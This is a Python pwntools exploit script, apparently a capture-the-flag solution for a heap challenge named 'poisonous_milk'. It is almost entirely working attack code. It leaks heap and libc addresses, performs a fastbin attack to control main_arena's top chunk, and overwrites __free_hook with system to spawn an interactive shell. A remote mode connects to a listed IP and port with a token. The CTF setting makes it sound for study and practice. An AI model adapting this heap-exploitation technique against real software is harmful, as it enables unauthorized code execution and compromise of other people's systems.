# coding=utf-8

from pwn import *
import sys

slog = 1
debug = 0
local = 1

if slog: context.log_level = 'DEBUG'

if local:
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so:./libc-2.23.so"
    p = process('./poisonous_milk', env=mine_env)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('52.27.136.59', 6969)
    libc = ELF('./libc-2.23.so')
    p.recvuntil('Token:')
    p.sendline('BwmDoZoJ9QjSFF65dgYP5eoNjGvoYl7K')

def put_milk(flags, color):
    p.recvuntil('> ')
    p.sendline('put')
    p.recvuntil('flags (0-99):')
    p.sendline(flags)
    p.recvuntil('color:')
    p.sendline(color)

def view():
    p.recvuntil('> ')
    p.sendline('view')

def remove(index):
    p.recvuntil('> ')
    p.sendline('remove')
    p.recvuntil('index : ')
    p.sendline(str(index))

def drink():
    p.recvuntil('> ')
    p.sendline('drink')

def ljust(astr, length, padding = 'a'):
    return astr.ljust(length, padding)

for i in range(20):
    put_milk('1', 'atack')
view()

p.recvuntil('[17] [')
leak_heap = u64(p.recv(6).ljust(8, '\x00'))
print 'leak_heap is', hex(leak_heap)
p.recvuntil('[18] [')
leak_libc = u64(p.recv(6).ljust(8, '\x00'))
print 'leak_libc is', hex(leak_libc)

drink()


pause()
put_milk(p64(leak_heap - 0x120) + p64(leak_heap - 0x120 + 0x28), 'attack')

payload = p64(leak_heap + 0x40) + p64(leak_heap + 0x60) + p64(leak_heap + 0xb0) + p64(leak_heap + 0xd0) + p64(leak_heap + 0x10) + p64(leak_heap + 0xd0)
payload = payload.ljust(0x50, 'b')
put_milk(payload, 'red')



if local:
    libc_base = leak_libc - 0x3C3B88
else:
    libc_base = leak_libc - 0x3C3B88
system_addr = libc_base + libc.symbols['system']

log.info('system_addr is '+ hex(system_addr))
free_hook = libc_base + libc.symbols['__free_hook']

put_milk('d'*0x50, 'red')
payload  = p64(0) + p64(0x41)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0x51)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0x41)
put_milk(payload, "red")


put_milk(ljust(p64(0) + p64(0) + p64(0) + p64(0x61) + p64(0) + p64(0), 0x50), 'red')

remove(1)
remove(0)


log.info("fastbin attack")
put_milk('/bin/sh\x00'.ljust(0x10, 'a') + p64(0) + p64(0x51) + p64(0x61) + 'a'*0x8, 'red')
put_milk('\x00' * 0x40, 'red')
remove(1)
remove(0)
put_milk(ljust('a'*0x10 + p64(0) + p64(0x61) + p64(leak_libc - 0x50), 0x50), 'red')
put_milk(ljust(p64(0) + p64(leak_heap + 0x40), 0x50, '\x00'), 'red')


remove(0)


log.info("control main_arena->top")
put_milk(ljust(p64(0)*6 + p64(free_hook - 0xa90) + p64(leak_heap + 0xb0) + p64(leak_libc - 0x10)*2, 0x50, '\x00'), 'red')
for i in range(10):
    put_milk('\x00' * 0x50, 'red')
for i in range(4):
    put_milk('\x00' * 0x50, 'red')
put_milk('\x00' * 0x30, 'red')
for i in range(4):
    put_milk('\x00' * 0x50, 'red')

put_milk('\x00' * 0x30, 'red')
#view()
put_milk('\x00' * 0x20, 'red')
put_milk('\x00' * 0x20, 'red')
put_milk('\x00' * 0x20, 'red')
if local and debug: gdb.attach(p, open('debug'))
put_milk(ljust(p64(0)*6 + p64(system_addr), 0x50, '\x00'), 'red')
remove(0)
p.interactive()
